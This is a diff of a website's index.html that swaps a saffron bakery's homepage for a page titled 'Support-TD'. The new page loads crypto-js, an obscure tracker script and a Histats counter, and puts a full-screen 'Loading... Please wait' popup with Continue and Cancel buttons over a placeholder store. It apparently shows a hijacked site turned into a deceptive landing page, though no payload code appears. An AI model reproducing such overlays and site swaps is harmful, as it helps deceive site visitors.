@@ -1,440 +1,312 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Saffron Nibble | Artisanal Saffron Confections, Pistachio Shortbread & Gourmet Delicacies</title>
-    <meta name="description" content="Saffron Nibble crafts luxury Persian and Kashmiri Super Negin saffron delicacies, pistachio shortbread, botanical wildflower honeys, and culinary infusions in New York.">
-    <link rel="canonical" href="https://saffronnibble.com/index.html">
-    <meta name="robots" content="index, follow">
-    <meta property="og:site_name" content="Saffron Nibble">
-    <meta property="og:title" content="Saffron Nibble | Artisanal Saffron Delicacies">
-    <meta property="og:description" content="Luxury saffron delicacies, pistachio shortbread, and botanical culinary infusions handcrafted in Mercer Street, New York.">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://saffronnibble.com/index.html">
-    <meta property="og:image" content="https://saffronnibble.com/images/hero_saffron_threads.jpg">
-    <meta name="twitter:card" content="summary_large_image">
-    <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'G-0LY0HY7L01');
-    </script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,600;0,700;0,800;1,600&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="assets/css/style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-    <header class="site-header">
-        <div class="header-inner">
-            <a href="index.html" class="brand-logo">
-                <span class="logo-mark">🪷</span>
-                <span class="logo-text">SAFFRON <span>NIBBLE</span></span>
-            </a>
-            <nav class="main-nav" id="mainNav">
-                <ul class="nav-list">
-                    <li class="nav-item"><a href="index.html" class="nav-link active">Home</a></li>
-                    <li class="nav-item"><a href="about.html" class="nav-link ">About</a></li>
-                    <li class="nav-item"><a href="blog.html" class="nav-link ">Blog</a></li>
-                    <li class="nav-item"><a href="contact.html" class="nav-link ">Contact</a></li>
-                    <li class="nav-item"><a href="privacy-policy.html" class="nav-link ">Privacy Policy</a></li>
-                    <li class="nav-item"><a href="terms-and-conditions.html" class="nav-link ">Terms & Conditions</a></li>
-                    <li class="nav-item"><a href="disclaimer.html" class="nav-link ">Disclaimer</a></li>
-                    <li class="nav-item"><a href="cookie-policy.html" class="nav-link ">Cookie Policy</a></li>
-                </ul>
-            </nav>
-            <div class="nav-actions">
-                <a href="contact.html" class="btn btn-header">Reserve Tasting</a>
-                <button class="mobile-toggle" id="mobileToggle" aria-label="Toggle navigation menu" aria-expanded="false">
-                    <span class="hamburger-box"><span class="hamburger-inner"></span></span>
-                </button>
-            </div>
-        </div>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
     </header>
 
-    <main class="site-main">
-        <!-- Section 1: Hero Gastronomy Editorial -->
-        <section class="hero-section">
-            <div class="container">
-                <div class="hero-grid">
-                    <div class="hero-content">
-                        <div class="hero-badges">
-                            <span class="badge-pill">Grade 1 Super Negin Saffron</span>
-                            <span class="badge-pill">Mercer Street Tasting Atelier</span>
-                            <span class="badge-pill">Artisanal Small-Batch</span>
-                        </div>
-                        <h1 class="hero-title">Golden Amber Delicacies <span>Spiced in Pure Stigmas</span></h1>
-                        <p class="hero-description">Saffron Nibble elevates the world's most prized culinary spice into delicate shortbread confections, golden honeycomb infusions, candied citrus bites, and aromatic culinary syrups for discerning palates and Michelin-starred kitchens.</p>
-                        <div class="hero-cta">
-                            <a href="contact.html" class="btn btn-primary">Reserve Tasting Tin</a>
-                            <a href="about.html" class="btn btn-secondary">Explore Spice Bedrock</a>
-                        </div>
-                        <div class="hero-stats">
-                            <div class="stat-item">
-                                <div class="stat-number">250+</div>
-                                <div class="stat-label">ISO Crocin Color Metric</div>
-                            </div>
-                            <div class="stat-item">
-                                <div class="stat-number">75,000</div>
-                                <div class="stat-label">Crocus Flowers per Pound</div>
-                            </div>
-                            <div class="stat-item">
-                                <div class="stat-number">100%</div>
-                                <div class="stat-label">Single-Origin Stigmas</div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="hero-media">
-                        <div class="hero-img-wrap">
-                            <img src="images/hero_saffron_threads.jpg" alt="Vibrant crimson Grade 1 Super Negin saffron stigmas harvested for luxury confections" width="600" height="600" loading="eager">
-                            <div class="hero-badge-overlay">
-                                <strong>Authentic Persian Super Negin</strong>
-                                <span>Zero additives &bull; 100% all-red stigmas</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-        <!-- Section 2: Botanical Saffron Bedrock -->
-        <section class="section">
-            <div class="container">
-                <div class="split-block">
-                    <div class="split-media">
-                        <div class="split-img-wrap">
-                            <img src="images/gourmet_crocus_harvest.jpg" alt="Hand harvesting Crocus sativus autumn flowers in historic spice groves" width="600" height="450" loading="lazy">
-                        </div>
-                    </div>
-                    <div class="split-content">
-                        <span class="section-badge">Botanical Bedrock</span>
-                        <h2 class="section-title">The Aristocrat of Spices <span>Reimagined for the Nibble</span></h2>
-                        <p>Saffron (Crocus sativus) blossoms for only two fleeting weeks in late autumn. Each delicate lilac flower yields exactly three crimson stigmas, which must be plucked by hand before dawn to prevent fragile aromatic safranal terpenes from evaporating under the morning sun.</p>
-                        <p>At Saffron Nibble, we refuse commercial dust or adulterated yellow styles. We source exclusively unblemished Super Negin threads possessing an ISO 3632 Category I reading of over 250 crocin color units. This uncompromising spice bedrock guarantees unmatched floral aroma, bittersweet depth, and an opulent gilded hue in every bite.</p>
-                        <ul class="feature-list">
-                            <li><strong>Pre-Dawn Plucking:</strong> Hand-gathered in small mountain micro-climates.</li>
-                            <li><strong>Zero Yellow Style:</strong> Pure, thick crimson tips rich in picrocrocin.</li>
-                            <li><strong>Cryo-Milled Preservation:</strong> Milled cold to retain volatile aroma compounds.</li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-        </section>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
 
-        <!-- Section 3: Signature Confectionery & Nibbles Capsule -->
-        <section class="section section-cream">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-badge">Atelier Capsule</span>
-                    <h2 class="section-title">Artisanal Saffron Delicacies <span>& Shortbread Morsels</span></h2>
-                    <p class="section-subtitle">Every confectionery recipe balances the earthy bittersweet floral notes of saffron with luscious European grass-fed butter, Persian wild pistachios, and raw cardamom pods.</p>
-                </div>
-                <div class="cards-grid-3">
-                    <div class="card card-with-img">
-                        <img src="images/saffron_pistachio_shortbread.jpg" alt="Golden saffron infused pistachio shortbread cookies" class="card-img-top" width="400" height="220" loading="lazy">
-                        <div class="card-body">
-                            <h3 class="card-title">Pistachio Saffron Sablé</h3>
-                            <p class="card-text">Slow-steeped saffron butter blended with roasted Bronte pistachio slivers and coarse flake salt, baked to golden crisp crumb perfection.</p>
-                            <a href="contact.html" class="btn btn-outline" style="width: 100%; margin-top: 1rem;">Order Gift Box</a>
-                        </div>
-                    </div>
-                    <div class="card card-with-img">
-                        <img src="images/candied_saffron_citrus.jpg" alt="Candied Sicilian orange peel glazed in saffron amber syrup" class="card-img-top" width="400" height="220" loading="lazy">
-                        <div class="card-body">
-                            <h3 class="card-title">Candied Saffron Citrus Peel</h3>
-                            <p class="card-text">Hand-cut Sicilian orange and Meyer lemon rinds simmered for seven days in an aromatic reduction of saffron threads and green cardamom.</p>
-                            <a href="contact.html" class="btn btn-outline" style="width: 100%; margin-top: 1rem;">Order Gift Box</a>
-                        </div>
-                    </div>
-                    <div class="card card-with-img">
-                        <img src="images/saffron_almond_confection.jpg" alt="Hand-rolled Persian saffron almond marzipan bonbons" class="card-img-top" width="400" height="220" loading="lazy">
-                        <div class="card-body">
-                            <h3 class="card-title">Saffron Almond Gaz Bonbons</h3>
-                            <p class="card-text">Fluffy egg-white nougat whipped with wild mountain manna, toasted almond batons, and crimson saffron essence, dusted in stoneground flour.</p>
-                            <a href="contact.html" class="btn btn-outline" style="width: 100%; margin-top: 1rem;">Order Gift Box</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 4: Extraction Science & Aroma Thermodynamics -->
-        <section class="section">
-            <div class="container">
-                <div class="split-block reverse">
-                    <div class="split-media">
-                        <div class="split-img-wrap">
-                            <img src="images/blog_saffron_steeping_thermodynamics.jpg" alt="Cold ice extraction vs warm steeping of saffron threads in laboratory glassware" width="600" height="450" loading="lazy">
-                        </div>
-                    </div>
-                    <div class="split-content">
-                        <span class="section-badge">Gastronomy Science</span>
-                        <h2 class="section-title">The Thermodynamics of <span>Saffron Flavor Release</span></h2>
-                        <p>Most home bakers inadvertently destroy saffron's delicate top notes by throwing dry threads into boiling water. High heat degrades safranal—the essential oil responsible for saffron's intoxicating aroma—turning pleasant floral notes unpleasantly medicinal.</p>
-                        <p>At Saffron Nibble, our pastry chefs employ the Iranian "Ice Extraction" protocol. Crushed stigmas are sprinkled over pure mountain ice shavings. As the ice gently melts at 4°C, water molecules penetrate the cell walls without thermal shock, releasing vivid water-soluble crocin pigments while locking in volatile aromatic terpenes.</p>
-                        <ul class="feature-list">
-                            <li><strong>Controlled Cryo-Maceration:</strong> 12-hour slow melt preserving fragile safranal.</li>
-                            <li><strong>Fat-Lipid Binding:</strong> Infusing fat-soluble carotenoids directly into clarified butter.</li>
-                            <li><strong>Optimized pH Balance:</strong> Preserves brilliant golden color without browning.</li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 5: The Mercer Street Culinary Atelier -->
-        <section class="section section-cream">
-            <div class="container">
-                <div class="split-block">
-                    <div class="split-media">
-                        <div class="split-img-wrap">
-                            <img src="images/mercer_culinary_atelier.jpg" alt="Mercer Street New York saffron tasting atelier and copper confectionery kettles" width="600" height="450" loading="lazy">
-                        </div>
-                    </div>
-                    <div class="split-content">
-                        <span class="section-badge">New York Atelier</span>
-                        <h2 class="section-title">Handmade on Mercer Street <span>in Small Artisanal Batches</span></h2>
-                        <p>Located at 181 Mercer Street in Manhattan's historic SoHo district, the Saffron Nibble atelier brings centuries of Middle Eastern and Mediterranean spice artistry to contemporary New York epicures.</p>
-                        <p>Every cookie is stamped by hand, every candy kettle stirred over gentle copper heat, and every jar of botanical honey hand-ladled. We produce no mass-market runs; our confections are baked fresh weekly in limited tasting editions to ensure maximum aroma vitality upon reaching your table.</p>
-                        <a href="contact.html" class="btn btn-primary" style="margin-top: 1rem;">Book Private Atelier Tasting</a>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 6: Saffron Honey & Gourmet Pantry Collection -->
-        <section class="section">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-badge">Epicurean Pantry</span>
-                    <h2 class="section-title">Botanical Infused Nectars <span>& Culinary Salts</span></h2>
-                    <p class="section-subtitle">Complement your home baking and cheese pairings with our hand-infused pantry creations.</p>
-                </div>
-                <div class="cards-grid-3">
-                    <div class="card">
-                        <div class="card-icon">🍯</div>
-                        <h3 class="card-title">Wildflower Saffron Honey</h3>
-                        <p class="card-text">Raw, unheated Catskills wildflower comb honey infused for three months with Grade 1 saffron stigmas and wild lavender buds. An unforgettable drizzle over aged Manchego.</p>
-                    </div>
-                    <div class="card">
-                        <div class="card-icon">🧂</div>
-                        <h3 class="card-title">Saffron Fleur de Sel</h3>
-                        <p class="card-text">Sun-evaporated French sea salt crystals ground with aromatic saffron powder and dried lemon zest. Imparts subtle golden radiance to seared fish and artisan focaccia.</p>
-                    </div>
-                    <div class="card">
-                        <div class="card-icon">🫙</div>
-                        <h3 class="card-title">Rosewater Saffron Botanical Cordial</h3>
-                        <p class="card-text">A non-alcoholic distillation of Damascus rose petals, organic cane nectar, and crushed saffron threads. Ideal for pastry brush glazes and sparkling botanical mocktails.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 7: Tasting Flights & Flight Comparison -->
-        <section class="section section-cream">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-badge">Atelier Flights</span>
-                    <h2 class="section-title">Curated Saffron Nibble Flights <span>For Special Gatherings</span></h2>
-                    <p class="section-subtitle">Experience the nuances of different harvest regions through our signature tasting flights.</p>
-                </div>
-                <div class="cards-grid-2">
-                    <div class="card">
-                        <div class="tasting-item">
-                            <span class="tasting-title">The Royal Persian Flight</span>
-                            <span class="tasting-price">$75 / Box</span>
-                        </div>
-                        <p class="card-text">Features Khorasan Super Negin sablés, saffron-cardamom almond brittle, and a 4oz jar of saffron wildflower honeycomb. Packaged in an embossed gilded metal keepsake tin.</p>
-                        <ul class="feature-list" style="margin-top: 1rem;">
-                            <li>12x Handcrafted Saffron Pistachio Sablés</li>
-                            <li>1x 4oz Infused Raw Comb Honey Jar</li>
-                            <li>1x Tin Saffron Almond Toffee Brittle</li>
-                        </ul>
-                        <a href="contact.html" class="btn btn-primary" style="margin-top: 1.5rem;">Reserve Persian Flight</a>
-                    </div>
-                    <div class="card">
-                        <div class="tasting-item">
-                            <span class="tasting-title">The Kashmiri Silk Harvest Flight</span>
-                            <span class="tasting-price">$88 / Box</span>
-                        </div>
-                        <p class="card-text">Features Pampore Mongra saffron infused shortbread, candied saffron ginger batons, and artisanal saffron citrus syrup for bespoke pastry glazing.</p>
-                        <ul class="feature-list" style="margin-top: 1rem;">
-                            <li>12x Pampore Mongra Shortbread Biscuits</li>
-                            <li>1x 200ml Rosewater Saffron Glazing Elixir</li>
-                            <li>1x Bag Candied Saffron Citrus Zest</li>
-                        </ul>
-                        <a href="contact.html" class="btn btn-primary" style="margin-top: 1.5rem;">Reserve Kashmiri Flight</a>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 8: Culinary Endorsements & Pastry Chef Reviews -->
-        <section class="section">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-badge">Epicurean Praise</span>
-                    <h2 class="section-title">Acclaimed by Pastry Masters <span>& Connoisseurs</span></h2>
-                    <p class="section-subtitle">Read what pastry chefs, food journalists, and culinary purists say about our saffron delicacies.</p>
-                </div>
-                <div class="cards-grid-3">
-                    <div class="testimonial-card">
-                        <p class="testimonial-quote">"The balance in Saffron Nibble's sablé cookies is astonishing. Saffron can easily overpower butter, but here it harmonizes like a baroque concerto."</p>
-                        <div class="testimonial-author">
-                            <div class="author-info">
-                                <strong>Chef Julien Laurent</strong>
-                                <span>Executive Pastry Chef, Manhattan</span>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="testimonial-card">
-                        <p class="testimonial-quote">"Their cold-steeping process preserves the safranal top notes without any bitterness. It is easily the finest artisanal confectionery in New York."</p>
-                        <div class="testimonial-author">
-                            <div class="author-info">
-                                <strong>Soraya Mirfakhrai</strong>
-                                <span>Author, Persian Culinary Heritage</span>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="testimonial-card">
-                        <p class="testimonial-quote">"We ordered the custom saffron gift tins for our corporate gala. Our guests were spellbound by the aroma the moment the gilded lid lifted."</p>
-                        <div class="testimonial-author">
-                            <div class="author-info">
-                                <strong>Genevieve Sterling</strong>
-                                <span>Culinary Director, Mercer Events</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 9: Frequently Answered Inquiries -->
-        <section class="section section-cream">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-badge">Culinary Knowledge</span>
-                    <h2 class="section-title">Frequently Asked Questions <span>About Saffron Delicacies</span></h2>
-                    <p class="section-subtitle">Everything you need to know about our sourcing, shelf life, and culinary storage.</p>
-                </div>
-                <div class="faq-accordion">
-                    <div class="accordion-item active">
-                        <button class="accordion-header">
-                            <span>How do you guarantee your saffron is pure and unadulterated?</span>
-                            <span class="accordion-icon">+</span>
-                        </button>
-                        <div class="accordion-content">
-                            <p>Every single batch of saffron entering our Mercer Street atelier undergoes third-party ISO 3632 testing for crocin (color intensity), safranal (aroma volatility), and picrocrocin (flavor profile). We test for the absence of synthetic dyes like tartrazine or adulterants like corn silk and safflower.</p>
-                        </div>
-                    </div>
-                    <div class="accordion-item">
-                        <button class="accordion-header">
-                            <span>How long do Saffron Nibble shortbread cookies stay fresh?</span>
-                            <span class="accordion-icon">+</span>
-                        </button>
-                        <div class="accordion-content">
-                            <p>Because our butter sablés are baked to a low water activity level without artificial preservatives, they remain wonderfully crisp and aromatic for 4 weeks at room temperature in their airtight gilded tins. To preserve peak aroma, keep away from direct sunlight.</p>
-                        </div>
-                    </div>
-                    <div class="accordion-item">
-                        <button class="accordion-header">
-                            <span>Do your confections contain any artificial colorings or flavorings?</span>
-                            <span class="accordion-icon">+</span>
-                        </button>
-                        <div class="accordion-content">
-                            <p>Never. The breathtaking radiant golden hue in our pastries and honeys comes 100% from natural crocin water-soluble carotenoids released by whole saffron stigmas. We use only organic dairy, non-GMO unbleached flours, raw honeys, and whole spices.</p>
-                        </div>
-                    </div>
-                    <div class="accordion-item">
-                        <button class="accordion-header">
-                            <span>Do you provide custom catering and bespoke corporate gift tins?</span>
-                            <span class="accordion-icon">+</span>
-                        </button>
-                        <div class="accordion-content">
-                            <p>Yes. Our confectionery atelier specializes in bespoke gift packaging, customized ribboning, and tailored flavor profiles for weddings, galas, and corporate gifting. Please submit your inquiry through our Contact page for wholesale or event requests.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 10: Atelier Tasting Reservation CTA -->
-        <section class="section">
-            <div class="container">
-                <div class="cta-banner">
-                    <h2>Experience the Golden Spice Atelier</h2>
-                    <p>Reserve a private culinary flight at our Mercer Street atelier or order a handcrafted tasting tin delivered freshly baked to your door.</p>
-                    <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
-                        <a href="contact.html" class="btn btn-secondary">Inquire For Delivery</a>
-                        <a href="about.html" class="btn btn-outline" style="color: #FFFFFF; border-color: #FFFFFF;">Discover Our Heritage</a>
-                    </div>
-                </div>
-            </div>
-        </section>
-    </main>
-
-    <footer class="site-footer">
-        <div class="container">
-            <div class="footer-grid">
-                <div class="footer-col brand-col">
-                    <a href="index.html" class="footer-logo">
-                        <span class="logo-mark">🪷</span>
-                        <span class="logo-text">SAFFRON <span>NIBBLE</span></span>
-                    </a>
-                    <p class="footer-tagline">Purveyors of rare Persian and Kashmiri Super Negin saffron delicacies, pistachio shortbread, botanical infusions, and gourmet culinary confections.</p>
-                    <div class="footer-contact-info">
-                        <p><strong>Mercer Culinary Atelier:</strong> 181 Mercer Street, New York, NY 10012, United States</p>
-                        <p><strong>Direct Line:</strong> <a href="tel:+18887775845">+1-888-777-5845</a></p>
-                        <p><strong>Atelier Concierge:</strong> <a href="mailto:atelier@saffronnibble.com">atelier@saffronnibble.com</a></p>
-                    </div>
-                </div>
-                <div class="footer-col">
-                    <h4 class="footer-heading">Culinary Confections</h4>
-                    <ul class="footer-links">
-                        <li><a href="index.html">Atelier Home</a></li>
-                        <li><a href="about.html">Botanical Bedrock</a></li>
-                        <li><a href="blog.html">Gastronomy Archives</a></li>
-                        <li><a href="contact.html">Bespoke Catering</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h4 class="footer-heading">Culinary Science</h4>
-                    <ul class="footer-links">
-                        <li><a href="blog/crocin-pigment-kinetics-and-culinary-solubility.html">Crocin Pigment Kinetics</a></li>
-                        <li><a href="blog/saffron-steeping-thermodynamics-ice-vs-warm-infusion.html">Steeping Thermodynamics</a></li>
-                        <li><a href="blog/pistachio-and-saffron-flavor-pairing-science.html">Pistachio Flavor Pairing</a></li>
-                        <li><a href="blog/persian-saffron-confectionery-and-gaz-traditions.html">Persian Confectionery History</a></li>
-                        <li><a href="blog/harvesting-super-negin-saffron-stigmas.html">Harvesting Super Negin Stigmas</a></li>
-                        <li><a href="blog/botanical-saffron-syrup-and-pastry-glazes.html">Botanical Syrups & Glazes</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h4 class="footer-heading">Trust & Legal</h4>
-                    <ul class="footer-links">
-                        <li><a href="privacy-policy.html">Privacy Policy</a></li>
-                        <li><a href="terms-and-conditions.html">Terms & Conditions</a></li>
-                        <li><a href="disclaimer.html">Culinary Disclaimer</a></li>
-                        <li><a href="cookie-policy.html">Cookie Policy</a></li>
-                    </ul>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <div class="footer-bottom-inner">
-                    <p class="copyright">&copy; 2026 Saffron Nibble. All rights reserved. Artisanal Saffron Confections & Culinary Infusions.</p>
-                    <div class="footer-legal-links">
-                        <a href="privacy-policy.html">Privacy</a>
-                        <a href="terms-and-conditions.html">Terms</a>
-                        <a href="disclaimer.html">Disclaimer</a>
-                        <a href="cookie-policy.html">Cookies</a>
-                    </div>
-                </div>
-            </div>
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-    </footer>
-    <button class="back-to-top" id="backToTop" aria-label="Back to top">↑</button>
-    <script src="assets/js/main.js"></script>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="about">
